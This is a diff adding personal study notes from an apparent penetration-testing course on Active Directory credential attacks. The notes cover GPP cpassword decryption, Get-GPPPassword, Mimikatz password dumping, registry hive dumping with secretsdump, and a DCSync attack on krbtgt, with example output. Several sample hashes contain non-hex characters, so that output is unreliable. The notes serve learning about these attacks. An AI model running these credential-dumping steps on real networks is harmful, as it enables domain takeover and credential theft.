@@ -183,3 +183,143 @@ iml-user:1000:aad3b435b51404eeaad3b435b51404ee:3b1b47e42e0463276e3ded6cef349f93:
 * **Task 1**: `xfreerdp /u:j.holloway /v:10.102.137.48 +clipboard +drives /drive:share,/home/kali /dynamic-resolution`. 
 * **Task 2**: To search recursively for a credentials file in `C:\Users`, I used `Get-ChildItem -Path "C:\Users" -Recurse -Filter "*cred*" -ErrorAction SilentlyContinue -Force` first, but it said to use both, so I also tried `Get-ChildItem -Path "C:\Users| -Recurse -ErrorAction SilentlyContinue -Force | Select-String -Pattern "credential"`. The first returned way cleaner results because it returned PATHS with the keyword, while the second returned instances of that string - a lot of mess!
 * **Tast 3 and onwards**: Pivoted to new Windows host (m.gibbs) via `xfreerdp` with the credentials found using the file from task 2. Then used `reg save HKLM\* *.bak` for the three registries. Once the hives were backed up and transferred to the attacking machine, I did `impacket-secretsdump -sam SAM.bak -system SYSTEM.bak -security SECURITY.bak LOCAL` which resulted in admin NTLM hash. 
+
+
+## Domain Passwords
+* Domain passwords often serve as low-hanging fruit for privilege escalation, lateral movement, and other exploitation within a domain. One key area of particular interest are passwords stored within Group Policy Preferences (GPP). GPP, while designed to simplify configuration management across multiple machines, could be vulnerable to password attack and lead to decryption of a plaintext password.
+  * If an admin's plaintext password is uncovered, this provides privileges to run tools like Mimikatz to help extract other domain password hashes and further infiltrate the domain.
+ 
+### Group Policy Preferences (GPP)
+* GPP allows domain-joined machines to be configured via a group policy. Admins can use GPP to configure computer and user configuration settings, including managing scheduled tasks, modifying registry settings, mapping network drives, and more.
+* GPP also allows admins to set local account passwords so they can manage access across the domain at the machine level. This makes GPPs potentially vulnerable, as stored passwords could be exploited to gain access to local administrator accounts on domain-joined machines.
+* Group policies for account management are stored on the domain controller in the SYSVOL folder. Sometimes, these files contain simple configurations, such as renaming an existing account, but others may have a "cpassword" field. This field is used to set passwords for local accounts through Group Policy.
+* The `groups.xml` file is a type of GPP file that contains configurations for adding, deleting, or modifying local groups, and it can also contain settings related to usernames and passwords. Here is an example of what a `group.xml` file looks like with a "cpassword" field:
+```
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{A1A1A1A1-B2B2-C3C3-D4D4-E5E5E5E5E5E5}">
+    <User clsid="{F6F6F6F6-E7E7-D8D8-C9C9-B0B0B0B0B0B0}" name="Example-Admin" image="2" changed="2025-01-03 09:12:34" uid="{81AB2328-D1C8-01B4-0CE8-ECBD2BA52E04}" userContext="0" removePolicy="0">
+        <Properties action="U" newName="" fullName="" description="" cpassword="BJl8ZZPxu6fDqm/mUK/djGzAhNITOd3iREOAWZRgUaHqcx+o/pBtzpzSU/JK0unv" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" subAuthority="" userName="Example-Admin"/>
+    </User>
+</Groups>
+```
+* Here, the user Example-Admin has their password set; however, the cpassword is encrypted with a predefined 32-byte AES private key, which Microsoft publicly outlined in 2012 on the MSDN site. THis means that anyone can use this AES key to decrypt the password to its plaintext. Though Microsoft patched this vulnerability with MS14-025 by preventing admins from putting passwords into new GPP, it didn't affect any GPP that were already in place, leaving many orgs still vulnerable if they weren't delete or disabled.
+* Other XML files that could include passwords are `services.xml`, `scheduledtasks.xml`, and `datasources.xml`, and are all accessible via the SYSVOL directory. Domain users have read access to SYSVOL, meaning they can search the SYSVOL for XML files containing a cpassword.
+  * With access to these XML files, if the GPP hasn't been deleted or disabled since the patch, you can use the AES private key to decrypt a cpassword and reveal domain passwords for further exploitation.
+* **Get-GPPPassword** is a PowerShell script that retrieves plaintext passwords and other information for accounts pushed through GPPs. It searches the domain controllers for `groups.xml`, `scheduledtasks.xml`, `services.xml`, and `datasources.xml`, and decrypts and returns any password it finds. Import the script after moving it to the machine with `. .\Get-GPPPassword.ps1`. Once imported, run it with `Get-GPPPassword`.
+  * Alternatively, if you have a Meterpreter session on a target, you could use the `post/windows/gather/credentials/gpp` Metasploit module to dump GPP credentials. This module will search for cpassword values stored in GPP and decrypt them with the known AES key.
+
+### Mimikatz
+* With your new admin credentials, you'll be able to log in as the adminstrator and run Mimikatz against the target to extract domain users' passwords, hashes, and more.
+
+#### Dumping Passwords
+* As you learned in a previous lab, Local Passwords, you can use Mimikatz to dump any logged-in users on the system. As a quick refresh, you first transfer Mimikatz to the target. Next, open Mimikatz as admin and then acquire debug privilege through `privilege::debug`.
+* Dump user sessions with `sekurlsa::logonpasswords`. Any user session credentials will then be displayed in the output. From here, you can log into the domain-joined machine with any found credentials and check the account's level of access. To do this, open command prompt with admin privileges and run `net user <user> /domain`. You can then find out which groups the user is a member of in the **Global Group memberships** field in the returned output, such as example shown below. In that example, j.doe is a member of the Domain Admins group - success!:
+```
+User name                    j.doe                                                                                    
+Full Name                                                                                                               
+Comment                                                                                                                 
+User's comment                                                                                                          
+Country/region code          000 (System Default)                                                                       
+Account active               Yes                                                                                        
+Account expires              Never                                                                                                                                                                                                              Password last set            2/27/2025 10:20:34 AM                                                                      
+Password expires             Never                                                                      
+Password changeable          2/28/2025 10:20:34 AM                                                                      
+Password required            Yes                                                                                        
+User may change password     Yes                                                                                                                                                                                                                Workstations allowed         All                                                                                        
+Logon script                                                                                                            
+User profile                                                                                                            
+Home directory                                                                                                          
+Last logon                   3/11/2025 4:11:07 PM                                                                                                                                                                                               Logon hours allowed          All                                                                                                                                                                                                                Local Group Memberships                                                                                                 
+Global Group memberships     *Domain Admins        *Domain Users                                                        
+```
+
+#### DCSync Attack
+* Domain Admin credentials are high-value targets in any attack. But what if you're after a different account? After you've compromised a Domain Admin you now have domain replication privileges. With these privileges, you can perform a DCSync attack.
+* A **DCSync attack** allows you to impersonate a Domain Controller (DC) and request password hashes from a target DC using Directory Replication Services (DRS) Remote Protocol. Normally, DCs use replication to synchronize with each other to ensure consistency of data across the domain. In this attack, you mimic DC behavior and request other DCs to replicate data - asking for copies of the AD database. This usually results in access to password hashes and potentially other sensitive information, which can then be used for a number of attacks, including **Golden Ticket** and **Pass-the-Hash**.
+* One example of using DCSync is to target the **krbtgt** built-in domain account. This account's main function is to provide tickets to authenticated users, which validates a user to services within the domain. If you can obtain the NTLM password hash for this domain account, you'll be able to forge Kerberos tickets that allow you to authenticate as any user in the domain.
+* To run a DCSync attack, you'll need to log into the machine with the DA credentials. You'll then need to use Mimikatz as an administrator, and run the following command: `lsadump::dcsync /user:EXAMPLE\krbtgt`. In the example below, the krbtgt account of the EXAMPLE domain is being targeted. The command returns a verbose amount of information, but most importantly, it returns the krbtgt NTLM hash, `a1b4c3e2f1d48901e5f6a7b8c9d0a1b2`. With this, you can now create a Golden Ticket or perform a Pass-the-Hash attack. 
+```
+[DC] 'example.com' will be the domain
+[DC] 'DC01.example.com' will be the DC server
+[DC] 'EXAMPLE\krbtgt' will be the user account
+[rpc] Service : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username : krbtgt
+Account Type : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration :
+Password last change : 3/13/2024 11:30:10 AM
+Object Security ID : S-1-5-18-4007567892-5236398763-5035627893-707
+Object Relative ID : 707
+
+Credentials:
+Hash NTLM: a1b4c3e2f1d48901e5f6a7b8c9d0a1b2
+ntlm- 0: a1b4c3e2f1d48901e5f6a7b8c9d0a1b2
+lm - 0: 4dcbadba2543d8b9f2a1b3c5d6e4f7g8
+
+Supplemental Credentials:
+
+Primary:NTLM-Strong-NTOWF *
+Random Value : 30rf157qq3de115dx225w99011bg21f5
+
+Primary:Kerberos-Newer-Keys *
+Default Salt : EXAMPLE.COMkrbtgt
+Default Iterations : 4096
+Credentials
+aes256_hmac (4096) : 6b1bbb22513062c2ff27394f87b1f64efc21h475gf70cz38e2302f45f4dfccf3
+aes128_hmac (4096) : 823gf30b2372fd16gz59bdcd16hh57cf
+des_cbc_md5 (4096) : 5gb263c8e963h773
+
+Primary:Kerberos *
+Default Salt : EXAMPLE.COMkrbtgt
+Credentials
+des_cbc_md5 : 5gb263c8e963h773
+
+Packages *
+NTLM-Strong-NTOWF
+
+Primary:WDigest *
+01 1fd991f17f940851pz09ahgf797b91f1
+02 8cg2c66537c63gf8fd9d4b11d2f7f1fe
+03 f2dacc115960f0f61fg9c27b3f3g4fe8
+04 1fd991f17f940851pz09ahgf797b91f1
+05 8cg2c66537c63gf8fd9d4b11d2f7f1fe
+06 gf1654cd36ff9f20f9482c346dfcdbhg
+07 1fd991f17f940851pz09ahgf797b91f1
+08 df3b5c38956b87c26hfed10437ccf702
+09 df3b5c38956b87c26hfed10437ccf702
+10 fe636516f643afg6d371b120f98g7fhf
+11 6eddb93g8f837396ahg943f9c1f4dgh7
+12 df3b5c38956b87c26hfed10437ccf702
+13 b2ca09g6f89feda3140f9c43b1dgdfd2
+14 6eddb93g8f837396ahg943f9c1f4dgh7
+15 85376h713f017cb8h36dchfdg334ig16
+16 85376h713f017cb8h36dchfdg334ig16
+17 3d9gh886g6h8weg4edeg7gg33c30711c
+18 4g3c17fb2f83d1h1ggh71f0f544dg934
+19 388e1g63df1346577c8083dd1659663b
+20 fh38cd2cc56ed3bcdgf615b5b3663gb7
+21 1h59eabcg56c530d0126146615c18gf9
+22 1h59eabcg56c530d0126146615c18gf9
+23 eg5f4g0g76g8fd8fhdha86f9105708d3
+24 51f2g560cb2390g45g8d21336547agi6
+25 51f2g560cb2390g45g8d21336547agi6
+26 g68afdc215b9d4de2f9h5f36eg6bf3gh
+27 de71dg509515f5fah8h5gh1069g28453
+28 4h0c24481j0g418gfdacb74701436gh5
+29 f34ghgf88g134dfg0f76g5h062914ch2
+```
+
+##### LAB: Kerberos: Golden and Silver Tickets
+* Silver tickets are aimed at service accounts. They allow an attacker to forge a TGS ticket for a specific service under any user account. For example, an MSSQL server only allows users that are part of the MSSQL group to log in. You can forge a silver ticket with this attack and connect to the MSSQL instance to retrieve sensitive data. To forge a silver ticket, you'll need:
+  * Domain security identifier (SID)
+  * Domain fully qualified domain name (FQDN)
+  * Service account's password hash
+  * Username to impersonate
+  * Service name
+  * Target
